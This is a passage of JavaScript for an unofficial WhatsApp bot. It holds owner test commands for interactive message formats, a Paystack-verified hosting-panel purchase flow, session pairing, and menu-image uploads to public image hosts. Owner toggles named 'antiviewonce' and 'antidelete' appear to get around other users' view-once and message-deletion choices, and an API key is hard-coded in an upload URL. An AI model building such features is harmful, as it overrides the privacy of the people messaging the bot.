      // resolve menu image to buffer
      let imgField1 = { url: imgUrl1 };
      try {
        if (imgUrl1.startsWith('data:')) {
          const b64 = imgUrl1.split(',')[1];
          if (b64) imgField1 = Buffer.from(b64, 'base64');
        } else if (imgUrl1.startsWith('http')) {
          const res = await axios.get(imgUrl1, { responseType: 'arraybuffer', timeout: 12000 });
          imgField1 = Buffer.from(res.data);
        } else {
          imgField1 = fs.readFileSync(imgUrl1);
        }
      } catch { imgField1 = { url: imgUrl1 }; }

      const imgPayload1 = Buffer.isBuffer(imgField1)
        ? { image: imgField1 }
        : { image: imgField1 };

      try {
        await sock.sendMessage(jid, {
          interactiveMessage: {
            header: c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
            title:  c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
            footer: `© ${settings.CREDITS || 'james'} | ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
            ...imgPayload1,
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                limited_time_offer: {
                  text: `🔗 Pair your bot now!`,
                  url:  settings.REQUIRED_PAIR_LINK || 'https://t.me/animemdoff_bot',
                  copy_code: prefix,
                  expiration_time: Date.now() * 999,
                },
                bottom_sheet: {
                  in_thread_buttons_limit: 2,
                  divider_indices: [1, 2, 3, 4, 5, 999],
                  list_title: c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
                  button_title: 'Select an option',
                },
                tap_target_configuration: {
                  title:         c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
                  description:   settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects',
                  canonical_url: settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                  domain:        'anime.md',
                  button_index:  0,
                },
              }),
              buttons: [
                {
                  name: 'single_select',
                  buttonParamsJson: JSON.stringify({
                    has_multiple_buttons: true,
                  }),
                },
                {
                  name: 'call_permission_request',
                  buttonParamsJson: JSON.stringify({
                    has_multiple_buttons: true,
                  }),
                },
                {
                  name: 'single_select',
                  buttonParamsJson: JSON.stringify({
                    title: '📋 Bot Menu',
                    sections: [
                      {
                        title: 'Quick Actions',
                        highlight_label: '⚡ Fast',
                        rows: [
                          {
                            title: `${prefix}menu`,
                            description: 'View all commands',
                            id: 'row_menu',
                          },
                          {
                            title: `${prefix}ping`,
                            description: 'Check bot speed',
                            id: 'row_ping',
                          },
                          {
                            title: `${prefix}alive`,
                            description: 'Check if bot is online',
                            id: 'row_alive',
                          },
                        ],
                      },
                      {
                        title: 'Links',
                        highlight_label: '🔗 Social',
                        rows: [
                          {
                            title: '📢 Channel',
                            description: 'Follow our Telegram channel',
                            id: 'row_channel',
                          },
                          {
                            title: '👥 Group',
                            description: 'Join our support group',
                            id: 'row_group',
                          },
                        ],
                      },
                    ],
                    has_multiple_buttons: true,
                  }),
                },
                {
                  name: 'cta_copy',
                  buttonParamsJson: JSON.stringify({
                    display_text: `📋 Copy Prefix`,
                    id:           'copy_prefix',
                    copy_code:    prefix,
                  }),
                },
              ],
            },
          },
        }, { quoted: m });
        await reply('✅ itest1 sent — check if image + native flow renders.');
      } catch (e) {
        await reply('❌ itest1 failed: ' + e.message);
      }
      break;
    }
case 'antiviewonce': {
    if (needOwner()) break;
    const arg = args[0]?.toLowerCase();
    let newState;
    if (arg === 'on' || arg === 'true' || arg === '1') {
        newState = true;
    } else if (arg === 'off' || arg === 'false' || arg === '0') {
        newState = false;
    } else {
        await reply(`Usage: .antiviewonce on/off\nCurrent: ${c.antiviewonce ? 'ON' : 'OFF'}`);
        break;
    }
    await setWaSetting(waNum, 'antiviewonce', newState);
    c.antiviewonce = newState;
    await reply(`✅ Anti‑view‑once is now ${newState ? 'ON' : 'OFF'}.`);
    break;
}
// ══════════════════════════════════════════════════════
//   BUYPANEL – Interactive panel selection
// ══════════════════════════════════════════════════════
// ══════════════════════════════════════════════════════
//   BUYPANEL – Interactive panel selection
// ══════════════════════════════════════════════════════
case 'buypanel': {
  let username = text.trim();
  if (username.startsWith('@')) username = username.slice(1).trim();

  if (!username || username.length < 3) {
    await reply(`📦 *${prefix}buypanel@<username>*\nExample: ${prefix}buypanel@kamau`);
    break;
  }

  const cleanUsername = username.toLowerCase().replace(/[^a-z0-9_-]/g, '');
  if (!cleanUsername || cleanUsername.length < 3) {
    await reply('❌ Username must be at least 3 characters (letters, numbers, underscore).');
    break;
  }

  const sessionKey = `${sender}_buypanel`;
  if (!global._pendingPanel) global._pendingPanel = {};
  global._pendingPanel[sessionKey] = { username: cleanUsername };

  await sendPanelList(sock, from, cleanUsername, m);
  break;
}

// ══════════════════════════════════════════════════════
//   VERIFY PAYMENT – Check Paystack & create panel
// ══════════════════════════════════════════════════════
case 'verifypayment': {
  const reference = args[0];
  if (!reference) {
    await reply(`🔍 ${prefix}verifypayment <reference>\nExample: ${prefix}verifypayment PANEL-628xxx-123456`);
    break;
  }

  await reaction('⏳');
  await reply('⏳ Verifying payment...');

  if (!global.pendingPayments) global.pendingPayments = new Map();

  const pending = global.pendingPayments.get(reference);
  if (!pending) {
    await reply('❌ Payment reference not found.');
    break;
  }

  if (pending.status === 'success') {
    await reply('✅ This payment was already verified and processed.');
    break;
  }

  const verify = await verifyPaystackPayment(reference);
  if (!verify || !verify.status) {
    await reply('❌ Verification failed. Please try again later.');
    break;
  }

  if (verify.data.status === 'success') {
    pending.status = 'success';
    const { username, ram, disk, cpu, isAdmin } = pending;
    try {
      const panelResult = await createPterodactylPanel(username, ram, disk, cpu, isAdmin);
      const typeLabel = isAdmin ? '👑 CPANEL' : '📦 ' + (ram === 0 ? 'Unlimited' : `${disk/1024}GB`) + ' Panel';
      const successMsg = `✅ *Panel Created Successfully!*\n\n` +
        `Type: ${typeLabel}\n` +
        `👤 Username: ${panelResult.username}\n` +
        `🔑 Password: ${panelResult.password}\n` +
        `📊 RAM: ${panelResult.ram === 0 ? 'Unlimited' : panelResult.ram + 'MB'}\n` +
        `💾 Disk: ${panelResult.disk === 0 ? 'Unlimited' : panelResult.disk + 'MB'}\n` +
        `⚡ CPU: ${panelResult.cpu === 0 ? 'Unlimited' : panelResult.cpu + '%'}\n` +
        `🔗 Login: ${panelResult.panelDomain}\n\n` +
        `⚠️ Save these credentials!`;
      await reply(successMsg);
      global.pendingPayments.delete(reference);
    } catch (e) {
      await reply(`❌ Panel creation failed: ${e.message}`);
    }
  } else {
    await reply(`⏳ Payment status: ${verify.data.status}. Please complete the payment and try again.`);
  }
  break;
}
    // ══════════════════════════════════════════════════════
    //   TEST: interactiveMessage format 2 (minimal copy button)
    // ══════════════════════════════════════════════════════
    case 'itest2': {
      if (needOwner()) break;
      await reaction('🧪');
      const imgUrl2 = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://files.catbox.moe/c6wcqp.jpeg';

      // resolve menu image to buffer
      let imgField2 = { url: imgUrl2 };
      try {
        if (imgUrl2.startsWith('data:')) {
          const b64 = imgUrl2.split(',')[1];
          if (b64) imgField2 = Buffer.from(b64, 'base64');
        } else if (imgUrl2.startsWith('http')) {
          const res = await axios.get(imgUrl2, { responseType: 'arraybuffer', timeout: 12000 });
          imgField2 = Buffer.from(res.data);
        } else {
          imgField2 = fs.readFileSync(imgUrl2);
        }
      } catch { imgField2 = { url: imgUrl2 }; }

      const imgPayload2 = Buffer.isBuffer(imgField2)
        ? { image: imgField2 }
        : { image: imgField2 };

      try {
        await sock.sendMessage(jid, {
          interactiveMessage: {
            header: c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
            title:  c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
            footer: `© ${settings.CREDITS || 'james'} | ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
            ...imgPayload2,
            buttons: [
              {
                name: 'cta_copy',
                buttonParamsJson: JSON.stringify({
                  display_text: `📋 Copy Prefix: ${prefix}`,
                  id:           'copy_prefix_simple',
                  copy_code:    prefix,
                }),
              },
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '🔗 Pair Bot',
                  url:          settings.REQUIRED_PAIR_LINK || 'https://t.me/animemdoff_bot',
                  merchant_url: settings.REQUIRED_PAIR_LINK || 'https://t.me/animemdoff_bot',
                }),
              },
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '📢 Follow Channel',
                  url:          settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                  merchant_url: settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                }),
              },
            ],
          },
        }, { quoted: m });
        await reply('✅ itest2 sent — check if minimal interactive renders.');
      } catch (e) {
        await reply('❌ itest2 failed: ' + e.message);
      }
      break;
    }

              // ══════════════════════════════════════════════════════
    //   TEST: interactiveMessage with document + externalAdReply
    // ══════════════════════════════════════════════════════
    case 'itest3': {
      if (needOwner()) break;
      await reaction('🧪');

      const imgUrl3  = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://files.catbox.moe/c6wcqp.jpeg';
      const botName3 = c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD';

      // resolve menu image to buffer for jpegThumbnail
      let thumbBuf = null;
      try {
        if (imgUrl3.startsWith('data:')) {
          const b64 = imgUrl3.split(',')[1];
          if (b64) thumbBuf = Buffer.from(b64, 'base64');
        } else if (imgUrl3.startsWith('http')) {
          const res = await axios.get(imgUrl3, { responseType: 'arraybuffer', timeout: 12000 });
          thumbBuf = Buffer.from(res.data);
        } else {
          thumbBuf = fs.readFileSync(imgUrl3);
        }
      } catch { thumbBuf = null; }

      // build a tiny valid PDF in memory so we don't need a real file
      const fakePdf = Buffer.from(
        '%PDF-1.4\n1 0 obj<</Type /Catalog /Pages 2 0 R>>endobj ' +
        '2 0 obj<</Type /Pages /Kids [3 0 R] /Count 1>>endobj ' +
        '3 0 obj<</Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]>>endobj\n' +
        'xref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n' +
        '0000000058 00000 n\n0000000115 00000 n\ntrailer<</Size 4 /Root 1 0 R>>\n' +
        'startxref\n190\n%%EOF'
      );

      try {
        const payload3 = {
          interactiveMessage: {
            header:   botName3,
            title:    botName3,
            footer:   `© ${settings.CREDITS || 'james'} | ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
            document:  fakePdf,
            mimetype: 'application/pdf',
            fileName: `${botName3.replace(/\s/g,'_')}.pdf`,
            contextInfo: {
              mentionedJid:   [sender],
              forwardingScore: 0,
              isForwarded:    false,
            },
            externalAdReply: {
              title:                botName3,
              body:                 settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects',
              mediaType:            3,
              thumbnailUrl:         imgUrl3.startsWith('http') ? imgUrl3 : undefined,
              mediaUrl:             settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
              sourceUrl:            settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
              showAdAttribution:    true,
              renderLargerThumbnail: false,
            },
            buttons: [
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '🔗 Pair Bot',
                  url:          settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot',
                  merchant_url: settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot',
                }),
              },
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '📢 Follow Channel',
                  url:          settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                  merchant_url: settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                }),
              },
              {
                name: 'cta_copy',
                buttonParamsJson: JSON.stringify({
                  display_text: `📋 Copy Prefix`,
                  id:           'copy_prefix_3',
                  copy_code:    prefix,
                }),
              },
            ],
          },
        };

        // attach jpegThumbnail if we got a buffer
        if (thumbBuf) payload3.interactiveMessage.jpegThumbnail = thumbBuf;

        await sock.sendMessage(jid, payload3, { quoted: m });
        await reply('✅ itest3 sent — check if document + ad reply + buttons render.');
      } catch (e) {
        await reply('❌ itest3 failed: ' + e.message);
      }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   TEST: productMessage
    // ══════════════════════════════════════════════════════
    case 'itest4': {
      if (needOwner()) break;
      await reaction('🛒');

      const imgUrl4  = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://files.catbox.moe/c6wcqp.jpeg';
      const botName4 = c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD';

      // resolve thumbnail
      let thumb4 = null;
      try {
        if (imgUrl4.startsWith('data:')) {
          const b64 = imgUrl4.split(',')[1];
          if (b64) thumb4 = Buffer.from(b64, 'base64');
        } else if (imgUrl4.startsWith('http')) {
          const res = await axios.get(imgUrl4, { responseType: 'arraybuffer', timeout: 12000 });
          thumb4 = Buffer.from(res.data);
        } else {
          thumb4 = fs.readFileSync(imgUrl4);
        }
      } catch { thumb4 = null; }

      try {
        const thumbField4 = thumb4
          ? { thumbnail: thumb4 }
          : { thumbnail: { url: imgUrl4 } };

        await sock.sendMessage(jid, {
          productMessage: {
            title:           botName4,
            description:     `🤖 ${botName4} – your ultimate WhatsApp bot.\n\nPrefix: ${prefix}\nOwner: ${kontributor[0] || botNumber}`,
            ...thumbField4,
            productId:       '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶MD001',
            retailerId:      settings.CREDITS || 'james',
            url:             settings.REQUIRED_PAIR_LINK || 'https://t.me/animemdoff_bot',
            body:            `Commands: ${Object.values(CMDS).flat().length}+ features`,
            footer:          `© ${settings.CREDITS || 'james'} | ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
            priceAmount1000: 0,
            currencyCode:    'USD',
            buttons: [
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '🔗 Pair Now',
                  url:          settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot',
                  merchant_url: settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot',
                }),
              },
              {
                name: 'cta_url',
                buttonParamsJson: JSON.stringify({
                  display_text: '📢 Channel',
                  url:          settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                  merchant_url: settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3',
                }),
              },
            ],
          },
        }, { quoted: m });
        await reply('✅ itest4 sent — check if product card renders.');
      } catch (e) {
        await reply('❌ itest4 failed: ' + e.message);
      }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   TEST: eventMessage
    // ══════════════════════════════════════════════════════
    case 'itest5': {
      if (needOwner()) break;
      await reaction('📅');

      const botName5 = c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD';

      // build start/end: next round hour + 2 hours
      const now5      = Math.floor(Date.now() / 1000);
      const startTime = now5 + 3600;          // 1 hour from now
      const endTime   = now5 + 3600 + 7200;   // 3 hours from now

      // parse optional args: itest5 <name> | <description>
      const evParts = text.split('|').map(s => s.trim());
      const evName  = evParts[0] || `${botName5} – Bot Launch Event`;
      const evDesc  = evParts[1] || `Join us for a live demo of ${botName5}!\n\nPrefix: ${prefix}\nOwner: ${kontributor[0] || botNumber}`;

      try {
        await sock.sendMessage(jid, {
          eventMessage: {
            isCanceled:         false,
            name:               evName,
            description:        evDesc,
            location: {
              degreesLatitude:  0,
              degreesLongitude: 0,
              name:             settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects HQ',
            },
            joinLink:           settings.REQUIRED_GROUP_LINK || 'https://call.whatsapp.com/video/example',
            startTime:          String(startTime),
            endTime:            String(endTime),
            extraGuestsAllowed: true,
          },
        }, { quoted: m });
        await reply(
          `✅ itest5 sent — event card created.\n\n` +
          `📅 *${evName}*\n` +
          `🕐 Starts: ${new Date(startTime * 1000).toLocaleString()}\n` +
          `🕔 Ends: ${new Date(endTime * 1000).toLocaleString()}\n\n` +
          `_Tip: use \`${prefix}itest5 Event Name | Event description\` for custom content_`
        );
      } catch (e) {
        await reply('❌ itest5 failed: ' + e.message);
      }
      break;
    }

    case 'ping':
case 'speed': {
  // Send a temporary "ping" message to measure latency
  const start = Date.now();
  const sent = await sock.sendMessage(jid, { text: '🏓 Pinging...' }, { quoted: m });
  const latency = Date.now() - start;

  // Determine speed label and color
  let speedLabel;
  let color;
  if (latency < 200) {
    speedLabel = 'FAST ⚡';
    color = '🟢';
  } else if (latency < 500) {
    speedLabel = 'MODERATE 💨';
    color = '🟡';
  } else {
    speedLabel = 'SLOW 🐢';
    color = '🔴';
  }

  // Build the content lines (these will be inside the box)
  const resultLines = [
    `${color} *Latency:* ${latency}ms`,
    `*Speed:* ${speedLabel}`,
    `*Network:* ${latency < 300 ? 'Excellent' : latency < 600 ? 'Good' : 'Poor'}`
  ];

  // Use the existing `reply` function to format the box
  await reply(resultLines.join('\n'));

  // Delete the temporary "ping" message (optional)
  await sock.sendMessage(jid, { delete: sent.key }).catch(() => {});
  break;
}
    case 'uptime': { await reply(`⏱ ${formatUptime(Date.now() - global.botStartTime)}`); break; }
    case 'alive':  { await reaction('✅'); await reply('✅ Alive and running!'); break; }

    // ── WhatsApp Pair Command — starts a NEW session ────────
    // Works exactly like Telegram /pair: creates wa_<tgId>_<phone> session
    // and sends the pairing code IN WhatsApp (DM to the sender).
    case 'pair': {
      if (!_isOwner) { await reply(`❌ Owner only command.`); break; }
      const pairNum = args[0]?.replace(/\D/g,'');
      if (!pairNum || pairNum.length < 7) {
        await reply(
          `📱 *${prefix}pair <number>*\n\n` +
          `Links a new WhatsApp number to this bot.\n` +
          `Example: *${prefix}pair 254704955033*\n\n` +
          `_(Owner only — starts a new session, never affects this one)_`
        );
        break;
      }

      // Build a session ID exactly like Telegram /pair does
      // Use a fixed "wa" tg-owner prefix so it matches the same format
      const ownerTgId = settings.OWNER_TELEGRAM_ID || 'wa';
      const newSessionId = `wa_${ownerTgId}_${pairNum}`;

      // Check if already connected
      if (global._activeSockets && global._activeSockets.has(newSessionId)) {
        await reply(`✅ +${pairNum} is already connected!\nUse *${prefix}delpair ${pairNum}* to disconnect.`);
        break;
      }

      await reply(`🔄 Starting new session for *+${pairNum}*...\nPairing code will arrive here shortly.`);

      // Use the global startWhatsApp exposed from index.js
      if (typeof global._startWhatsApp === 'function') {
        // Send pairing code back to THIS chat (jid) not to Telegram
        global._startWhatsApp(newSessionId, null, pairNum, null, async (code) => {
          await sock.sendMessage(jid, {
            text:
              `🔑 *Pairing Code for +${pairNum}*\n\n` +
              `\`${code}\`\n\n` +
              `📌 Open WhatsApp → Linked Devices → Link a Device → Link with phone number`,
          }, { quoted: m });
        }).catch(async (e) => {
          await reply(`❌ Session start failed: ${e.message}`);
        });
      } else {
        // Fallback if global not set yet — instruct owner to use Telegram /pair
        await reply(
          `⚠️ WhatsApp pair via WA is only available after the bot fully boots.\n\n` +
          `Use *Telegram /pair ${pairNum}* instead — it works the same way.`
        );
      }
      break;
    }

    case 'owner': {
      const ownerNum = kontributor[0] || botNumber;
      await sock.sendMessage(jid, {
        contacts: { displayName: 'Bot Owner', contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Bot Owner\nTEL;type=CELL;waid=${ownerNum}:+${ownerNum}\nEND:VCARD` }] },
      }, { quoted: qchanel });
      break;
    }

    case 'support':   { await reply(`🆘 *Support*\nJoin: ${settings.REQUIRED_GROUP_LINK || 'Contact owner'}`); break; }
    case 'developer': { await reply(`👨‍💻 *Developer*\n${settings.CREDITS || ''}\n${settings.COMPANY || ' projects'}`); break; }
    case 'updates':   { await reply(`🔄 *Updates*\nv${settings.BOT_VERSION} – Latest\nChannel: ${settings.REQUIRED_CHANNEL_LINK || ''}`); break; }
    

    // ══════════════════════════════════════════════════════
    //   OWNER
    // ══════════════════════════════════════════════════════

    // FIXED: setprefix now sets ONE prefix for this session (no multi-prefix regex override)
    case 'setprefix': {
      if (needOwner()) break;
      const np = args[0];
      if (!np) { await reply(`${prefix}setprefix <symbol>\nCurrent: ${prefix}`); break; }
      setWaSetting(waNum, 'prefix', np);
      await reply(`✅ Prefix → *${np}*\nRestart is NOT needed, takes effect immediately.`);
      break;
    }

    case 'setowner': {
      if (needOwner()) break;
      const t  = getTargetJid(m, args);
      const no = t ? normNum(t) : args[0]?.replace(/\D/g,'');
      if (!no) { await reply(`${prefix}setowner <number> or reply`); break; }
      setWaSetting(waNum, 'owner', no);
      try {
        const existing = JSON.parse(fs.readFileSync(ownerFile, 'utf8'));
        if (!existing.includes(no)) { existing.push(no); fs.writeFileSync(ownerFile, JSON.stringify(existing, null, 2)); }
      } catch { fs.writeFileSync(ownerFile, JSON.stringify([no], null, 2)); }
      await reply(`✅ Owner → ${no}`);
      break;
    }

    case 'setbotname': {
      if (needOwner()) break;
      const name = args.join(' '); if (!name) { await reply(`${prefix}setbotname <name>`); break; }
      setWaSetting(waNum, 'botName', name);
      await reply(`✅ Bot name → ${name}`);
      break;
    }

    // setmenuimg – 7-fallback chain, must work no matter what
    case 'setmenuimg': {
      if (needOwner()) break;

      // ── collect raw buffer from wherever the image comes from ──
      let imgBuf = null;
      let imgSource = '';

      const { qMsg: qMSMI, qType: qTSMI, qKey: qKSMI } = getQuoted(m);

      // FB1: image attached directly with the command
      if (!imgBuf && m.message?.imageMessage) {
        try {
          const b = await dlMedia({ imageMessage: m.message.imageMessage }, m.key);
          if (b && b.length > 200) { imgBuf = b; imgSource = 'attached image'; }
        } catch {}
      }

      // FB2: reply to an imageMessage
      if (!imgBuf && qTSMI === 'imageMessage' && qMSMI?.imageMessage) {
        try {
          const b = await dlMedia({ imageMessage: qMSMI.imageMessage }, qKSMI);
          if (b && b.length > 200) { imgBuf = b; imgSource = 'replied image'; }
        } catch {}
      }

      // FB3: reply to a stickerMessage (convert sticker→jpg)
      if (!imgBuf && qTSMI === 'stickerMessage' && qMSMI?.stickerMessage) {
        try {
          const b = await dlMedia({ stickerMessage: qMSMI.stickerMessage }, qKSMI);
          if (b && b.length > 200) { imgBuf = b; imgSource = 'replied sticker'; }
        } catch {}
      }

      // FB4: reply to a videoMessage (take first frame via ffmpeg)
      if (!imgBuf && qTSMI === 'videoMessage' && qMSMI?.videoMessage) {
        try {
          const b = await dlMedia({ videoMessage: qMSMI.videoMessage }, qKSMI);
          if (b && b.length > 200) {
            const tmpV = `/tmp/smi_vid_${Date.now()}`;
            fs.writeFileSync(`${tmpV}.mp4`, b);
            await new Promise((res2, rej2) =>
              exec(`ffmpeg -y -i ${tmpV}.mp4 -frames:v 1 ${tmpV}.jpg 2>/dev/null`, e2 => e2 ? rej2(e2) : res2())
            );
            const frame = fs.readFileSync(`${tmpV}.jpg`);
            try { fs.unlinkSync(`${tmpV}.mp4`); fs.unlinkSync(`${tmpV}.jpg`); } catch {}
            if (frame.length > 200) { imgBuf = frame; imgSource = 'video frame'; }
          }
        } catch {}
      }

      // FB5: URL passed as argument – download it
      if (!imgBuf && args[0]?.startsWith('http')) {
        try {
          const b = await getBuffer(args[0]);
          if (b && b.length > 200) { imgBuf = b; imgSource = 'url (downloaded)'; }
        } catch {}
      }

      // ── now we have a buffer (or not). Try to get a hosted URL ──
      if (imgBuf) {
        let hostedUrl = null;

        // Upload attempt 1: Telegraph via helper
        if (!hostedUrl) {
          try {
            const { uploadToTelegraph } = require('./helper/uploader');
            const u = await uploadToTelegraph(imgBuf, 'image/jpeg');
            if (u && u.startsWith('http')) hostedUrl = u;
          } catch {}
        }

        // Upload attempt 2: telegra.ph raw POST
        if (!hostedUrl) {
          try {
            const FormData = require('form-data');
            const form = new FormData();
            form.append('file', imgBuf, { filename: 'img.jpg', contentType: 'image/jpeg' });
            const res2 = await axios.post('https://telegra.ph/upload', form, {
              headers: form.getHeaders(),
              timeout: 20000,
            });
            const src = res2.data?.[0]?.src;
            if (src) hostedUrl = 'https://telegra.ph' + src;
          } catch {}
        }

        // Upload attempt 3: catbox.moe
        if (!hostedUrl) {
          try {
            const FormData = require('form-data');
            const form = new FormData();
            form.append('reqtype', 'fileupload');
            form.append('fileToUpload', imgBuf, { filename: 'img.jpg', contentType: 'image/jpeg' });
            const res2 = await axios.post('https://catbox.moe/user/api.php', form, {
              headers: form.getHeaders(),
              timeout: 25000,
            });
            if (res2.data?.startsWith('http')) hostedUrl = res2.data.trim();
          } catch {}
        }

        // Upload attempt 4: imgbb (key-free endpoint)
        if (!hostedUrl) {
          try {
            const b64 = imgBuf.toString('base64');
            const res2 = await axios.post(
              'https://api.imgbb.com/1/upload?key=2e2b7ef8e6e2b7a3c1d0f9a8b7c6d5e4',
              `image=${encodeURIComponent(b64)}`,
              { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 20000 }
            );
            const u = res2.data?.data?.url;
            if (u?.startsWith('http')) hostedUrl = u;
          } catch {}
        }

        // FB6: if all uploads failed but we have a buffer → store locally as base64 data-URL
        // (works for menus since we read it back as a buffer anyway)
        if (!hostedUrl) {
          try {
            const b64 = imgBuf.toString('base64');
            hostedUrl = `data:image/jpeg;base64,${b64}`;
          } catch {}
        }

        if (hostedUrl) {
          setWaSetting(waNum, 'menuImg', hostedUrl);
          const isDataUrl = hostedUrl.startsWith('data:');
          await reply(`✅ Menu image set from *${imgSource}*.${isDataUrl ? '\n_Stored locally (all upload hosts failed)._' : `\n🔗 ${hostedUrl}`}`);
        } else {
          await reply('❌ Got image buffer but could not store it. Check your uploader helper.');
        }
        break;
      }

      // FB7: URL passed as argument – use it directly without downloading (last resort)
      if (args[0]?.startsWith('http')) {
        setWaSetting(waNum, 'menuImg', args[0]);
        await reply(`✅ Menu image URL saved directly: ${args[0]}`);
        break;
      }

      await reply(
        `❌ No image found. Try:\n` +
        `• Send an image + *${prefix}setmenuimg* as caption\n` +
        `• Reply to any image/sticker/video with *${prefix}setmenuimg*\n` +
        `• *${prefix}setmenuimg <direct image url>*`
      );
      break;
    }

    case 'setbotimg': {
      if (needOwner()) break;
      const { qMsg, qType, qKey } = getQuoted(m);
      const ownImg = m.message?.imageMessage;
      let buf = null;
      try {
        if (ownImg) {
          buf = await dlMedia({ imageMessage: ownImg }, m.key);
        } else if (qType === 'imageMessage') {
          buf = await dlMedia({ imageMessage: qMsg.imageMessage }, qKey);
        } else if (args[0]?.startsWith('http')) {
          buf = await getBuffer(args[0]);
        } else {
          await reply(`Reply to an image OR ${prefix}setbotimg <url>`);
          break;
        }
        if (!buf || buf.length < 100) throw new Error('Image buffer is empty');
        let finalBuf = buf;
        try {
          const sharp = require('sharp');
          finalBuf = await sharp(buf).resize(640, 640, { fit: 'cover' }).jpeg({ quality: 90 }).toBuffer();
        } catch { finalBuf = buf; }
        await sock.updateProfilePicture(sock.user.id, finalBuf);
        await reply('✅ Bot picture updated.');
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    case 'setfonts': {
      if (needOwner()) break;
      const fi = parseInt(args[0], 10);
      if (isNaN(fi) || fi < 0 || fi > 12) {
        await reply('0=Normal 1=Script 2=Italic 3=BoldItalic 4=Bold 5=Sans 6=SansItalic 7=SansBoldItalic 8=SansBold 9=Fraktur 10=BoldFraktur 11=DoubleStruck 12=Mono\n.setfonts <0-12>');
        break;
      }
      setWaSetting(waNum, 'font', fi);
      await reply(`✅ Font → style ${fi}`);
      break;
    }

    case 'public': { if (needOwner()) break; setWaSetting(waNum, 'mode', 'public'); await reply('✅ Mode → public'); break; }
    case 'self':   { if (needOwner()) break; setWaSetting(waNum, 'mode', 'self');   await reply('✅ Mode → self');   break; }

    case 'addprem': {
      if (needOwner()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('Reply or pass number.'); break; }
      await reply(addPremium(t) ? `✅ @${normNum(t)} → premium` : 'Already premium.');
      break;
    }

    case 'delprem': {
      if (needOwner()) break;
      const t = getTargetJid(m, args); if (!t) { await reply('Reply or pass number.'); break; }
      await reply(removePremium(t) ? `✅ @${normNum(t)} removed` : 'Not premium.');
      break;
    }

    case 'antidelete': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}antidelete on/off`); break; }
      setWaSetting(waNum, 'antidelete', v === 'on');
      await reply(`✅ AntiDelete → ${v}`);
      break;
    }

    case 'anticall': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}anticall on/off`); break; }
      setWaSetting(waNum, 'anticall', v === 'on');
      await reply(`✅ AntiCall → ${v}`);
      break;
    }

    case 'iphonemode': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
      if (!['on','off'].includes(v)) { await reply(`${prefix}iphonemode on/off`); break; }
      setWaSetting(waNum, 'iphoneMode', v === 'on');
      await reply(`✅ iPhone mode → ${v}`);
      break;
    }

    case 'autoviewstatus': {
      if (needOwner()) break;
      const v = args[0]?.toLowerCase();
